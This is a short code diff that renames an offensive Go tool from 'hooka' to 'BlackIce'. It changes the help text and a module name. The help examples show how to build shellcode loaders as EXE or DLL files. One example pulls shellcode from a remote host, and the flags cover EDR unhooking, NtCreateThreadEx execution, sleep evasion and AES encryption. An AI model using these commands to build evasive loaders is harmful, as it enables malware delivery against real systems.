@@ -103,10 +103,10 @@ Usage of BlackIce:
     -h, --help          print help panel
 
 Examples:
-  hooka -i shellcode.bin -o loader.exe
-  hooka -i http://192.168.1.126/shellcode.bin -o loader.exe
-  hooka -i shellcode.bin -o loader.exe --exec NtCreateThreadEx --unhook full --sleep --acg
-  hooka -i shellcode.bin -o loader.dll --domain www.domain.com --enc aes --verbose
+  blackice -i shellcode.bin -o loader.exe
+  blackice -i http://192.168.1.126/shellcode.bin -o loader.exe
+  blackice -i shellcode.bin -o loader.exe --exec NtCreateThreadEx --unhook full --sleep --acg
+  blackice -i shellcode.bin -o loader.dll --domain www.domain.com --enc aes --verbose
 `)
 }
 
@@ -3247,7 +3247,7 @@ func CompileLoader(format string, output_file string, compress bool, arch string
   if os.IsNotExist(err) {
 
     // if it doesn't exist, then create it
-    mod_cmd := exec.Command("go", "mod", "init", "hooka_ldr")
+    mod_cmd := exec.Command("go", "mod", "init", "blackice_ldr")
     err = mod_cmd.Run()
     if err != nil {
       return err
